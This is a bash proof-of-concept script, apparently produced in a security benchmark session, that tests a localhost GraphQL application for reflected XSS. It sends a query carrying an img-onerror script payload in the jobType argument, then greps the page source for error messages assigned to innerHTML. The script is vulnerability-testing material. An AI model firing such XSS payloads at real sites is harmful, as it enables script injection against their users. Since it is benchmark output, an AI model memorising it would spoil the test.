#!/bin/bash
# POC: Demonstrates Reflected XSS via GraphQL error messages by crafting payloads that exploit innerHTML assignment of unescaped error messages
# Target: ./repo
# Created: 2025-11-10T15:10:05.164Z
# Session: benchmark-XBEN-038-24-mht9rpjz

# Reflected XSS in GraphQL Error Messages POC
# This script tests whether the GraphQL error handler is vulnerable to XSS
# by attempting to inject HTML/JavaScript through error message handling

TARGET="${1:-http://localhost:8000}"
GRAPHQL_ENDPOINT="$TARGET/graphql/"

echo "[*] Reflected XSS in GraphQL Error Messages POC"
echo "[*] Target: $TARGET"
echo ""

# Test 1: Craft a GraphQL query that triggers an error and includes HTML payload
echo "[*] Test 1: Checking if error messages are rendered via innerHTML (vulnerable)"
echo ""

# Query that will trigger an error and potentially include XSS payload
MALICIOUS_QUERY='query { jobs(jobType: "<img src=x onerror=alert(\"XSS\")>") { id name } }'

# Send the malicious query to the GraphQL endpoint
echo "[*] Sending crafted GraphQL query..."
RESPONSE=$(curl -s -X POST \
    -H "Content-Type: application/json" \
    -d "{\"query\": \"query { jobs(jobType: \\\"<img src=x onerror=alert('XSS')>\\\") { id name } }\"}" \
    "$GRAPHQL_ENDPOINT")

echo "[*] Server Response:"
echo "$RESPONSE" | head -20
echo ""

# Test 2: Check if the response contains the HTML payload
if echo "$RESPONSE" | grep -q "<img"; then
    echo "[+] VULNERABLE: Server echoes HTML tags in error message"
    echo "[+] If this HTML is rendered via innerHTML, XSS would execute"
    
    # Extract the error message
    ERROR_MSG=$(echo "$RESPONSE" | grep -o '"message":"[^"]*"' | head -1)
    echo "[*] Error message found: $ERROR_MSG"
    echo ""
fi

# Test 3: Attempt to verify innerHTML vulnerability by checking page source
echo "[*] Test 3: Checking if error messages appear in HTML output when fetching the main page"
echo ""

# Fetch the main page to see if it includes vulnerable code pattern
PAGE_SOURCE=$(curl -s "$TARGET")

if echo "$PAGE_SOURCE" | grep -q "resultDiv.innerHTML"; then
    echo "[+] VULNERABLE CODE PATTERN FOUND: innerHTML usage detected"
    
    # Extract the vulnerable code section
    VULN_CODE=$(echo "$PAGE_SOURCE" | grep -A 5 "resultDiv.innerHTML" | head -10)
    echo "[*] Vulnerable code snippet:"
    echo "$VULN_CODE"
    echo ""
    
    if echo "$VULN_CODE" | grep -q 'errorMessages' || echo "$VULN_CODE" | grep -q '\${.*error'; then
        echo "[+] CONFIRMED: Error messages are rendered via innerHTML without encoding"
        echo "[+] Vulnerability confirmed: unescaped error messages assigned to innerHTML"
        exit 0
    fi
fi

# Test 4: Alternative test - check if error handling uses innerHTML
echo "[*] Test 4: Analyzing source code for vulnerable error handling pattern"
echo ""

if echo "$PAGE_SOURCE" | grep -E 'error.*Message|json\.errors' | grep -q 'innerHTML'; then
    echo "[+] VULNERABLE PATTERN CONFIRMED: Error messages rendered via innerHTML"
    PATTERN=$(echo "$PAGE_SOURCE" | grep -B 2 -A 2 'error.*Message.*innerHTML' | head -10)
    echo "[*] Pattern found:"
    echo "$PATTERN"
    exit 0
fi

# Test 5: Extract and analyze the actual error handling code
if echo "$PAGE_SOURCE" | grep -q "json.errors"; then
    echo "[+] Error handling code found in application"
    ERROR_HANDLER=$(echo "$PAGE_SOURCE" | grep -A 10 "json.errors" | head -15)
    echo "[*] Error handler code:"
    echo "$ERROR_HANDLER"
    echo ""
    
    if echo "$ERROR_HANDLER" | grep -q "innerHTML"; then
        echo "[+] VULNERABLE: Error messages are assigned to innerHTML"
        echo "[+] This means unescaped HTML/JS in error messages would execute"
        exit 0
    fi
fi

echo "[-] Could not confirm vulnerability in this test run"
echo "[*] Vulnerability exists if:"
echo "    1. json.errors messages are rendered via innerHTML"
echo "    2. Error messages contain unescaped user-influenced content"
echo "    3. No HTML encoding is applied before innerHTML assignment"

exit 1